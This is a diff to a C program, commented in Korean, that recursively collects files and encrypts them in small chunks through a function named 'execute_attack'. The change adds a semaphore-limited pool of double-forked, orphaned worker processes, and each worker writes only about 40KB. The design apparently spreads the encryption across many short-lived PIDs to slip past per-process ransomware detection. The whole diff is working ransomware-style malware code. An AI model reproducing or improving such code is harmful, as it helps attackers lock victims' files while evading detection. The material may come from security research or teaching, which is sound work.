@@ -7,6 +7,8 @@
 #include <dirent.h>
 #include <limits.h>
 #include <errno.h>
+#include <semaphore.h>  // 세마포어
+#include <sys/mman.h>   // mmap (공유 메모리)
 
 #include "crypto.h"     // encrypt_chunk_range, decrypt_chunk_range
 #include "file_ops.h"   // file_queue, file_count, scan_directory_recursive
@@ -16,6 +18,10 @@
 
 // 한 PID가 처리할 청크 개수 (10번 → 약 40KB)
 #define MAX_WRITES_PER_PID 10
+
+// 프로세스 제한을 위한 세마포어 포인터 (최대 동시 실행 수 제한)
+// main 함수에서 mmap으로 할당할 예정
+static sem_t *proc_limiter = NULL;
 
 
 /**
@@ -37,46 +43,63 @@ static void print_usage(const char *prog_name) {
  * @return 0: 성공, 1: 실패
  */
 static int spawn_worker(const char *target, long offset, int chunks, int mode) {
+    
+    // 0. 입장권 확인 (프로세스 수 제한)
+    // 빈 자리가 날 때까지 대기 (Blocking)
+    if (proc_limiter) sem_wait(proc_limiter);
+    
+    // 1. 첫 번째 포크 (Main -> Child 1)
     pid_t pid = fork();
 
     if (pid < 0) {
-        perror("Fork failed");
+        perror("First fork failed");
+        if (proc_limiter) sem_post(proc_limiter); // 실패 시 입장권 반납
         return 1;
     }
 
     if (pid == 0) {
-        // ---- [Child] ----
-        int ret;
-        if (mode == 0) {
-            ret = encrypt_chunk_range(target, offset, chunks);
-        } else {
-            ret = decrypt_chunk_range(target, offset, chunks);
-        }
+        // ---- [Child 1] ----
+        // 2. 두 번째 포크 (Child 1 -> Child 2)
+        pid_t grand_pid = fork();
 
-        if (ret != 0) {
+        if (grand_pid < 0) {
+            perror("Second fork failed");
+            if (proc_limiter) sem_post(proc_limiter);
             _exit(1);
         }
+        if (grand_pid == 0) {
+            // ---- [Child 2] ----
+            int ret;
+            if (mode == 0) {
+                ret = encrypt_chunk_range(target, offset, chunks);
+            } else {
+                ret = decrypt_chunk_range(target, offset, chunks);
+            }
+
+            // 작업 완료 이후 입장권 반납 (Main이 대기 중이면 깨어남)3
+            // 손자 프로세스는 부모와 메모리가 다르지만, mmap된 영역은 공유됨.
+            if (proc_limiter) sem_post(proc_limiter);
+
+            if (ret != 0) {
+                _exit(1);
+            }
+            _exit(0);
+        }
+        // 자식2를 낳았으므로 자식1의 역할은 끝. 즉시 종료하여 손자를 '고아'로 만듦.
+        // 아직 손자가 일을 하고 있으므로 sem_post를 하면 안됨.
         _exit(0);
-    } else {
+    }
+    else {
         // ---- [Parent] ----
+        // 자식 1이 종료될 때까지만 기다림.
+        // 자식 1은 손자를 낳자마자 바로 죽으므로 waitpid는 거의 즉시 반환됨.
         int status;
         if (waitpid(pid, &status, 0) < 0) {
             perror("waitpid failed");
             return 1;
         }
 
-        if (WIFSIGNALED(status)) {
-            printf("[SKIP] 자식이 시그널로 종료됨: %s (signal=%d)\n",
-                   target, WTERMSIG(status));
-            return 1;
-        } else if (WIFEXITED(status)) {
-            int code = WEXITSTATUS(status);
-            if (code != 0) {
-                printf("[SKIP] 자식 종료 코드=%d: %s\n", code, target);
-                return 1;
-            }
-        }
-
+        // 메인 프로세스는 손자(실제 일꾼)를 기다리지 않고 바로 다음 루프로 넘어감.
         return 0;
     }
 }
@@ -137,6 +160,10 @@ void execute_attack(int mode) {
         while (current_offset < total_size) {
             int ret = spawn_worker(target, current_offset, MAX_WRITES_PER_PID, mode);
             child_round++;
+            
+            // 세마포어 제어가 있으므로 usleep은 필수가 아니지만, 
+            // 너무 빠른 루프 회전으로 인한 CPU 점유율 조절용으로 짧게 유지
+            usleep(1000);
 
             if (ret != 0) {
                 attack_failed = 1;
@@ -223,7 +250,28 @@ int main(int argc, char *argv[]) {
 
     printf(">>> Found %d files\n", file_count);
 
+    // [추가] 세마포어 초기화 (익명 공유 메모리 사용)
+    proc_limiter = mmap(NULL, sizeof(sem_t),
+                        PROT_READ | PROT_WRITE,
+                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    if (proc_limiter == MAP_FAILED) {
+        perror("mmap failed");
+        return 1;
+    }
+
+    // 세마포어 값 설정 (1: 공유 모드, 10: 동시 실행 프로세스 개수)
+    // 10으로 설정하면 프로세스가 최대 10개까지만 생성되고, 하나가 끝나야 다음 하나가 생성됨
+    if (sem_init(proc_limiter, 1, 10) == -1) {
+        perror("sem_init failed");
+        return 1;
+    }
+
     execute_attack(mode);
+
+    // 리소스 정리
+    sem_destroy(proc_limiter);
+    munmap(proc_limiter, sizeof(sem_t));
 
     printf("------------------------\n");
     printf("--- End Traversal ---\n");
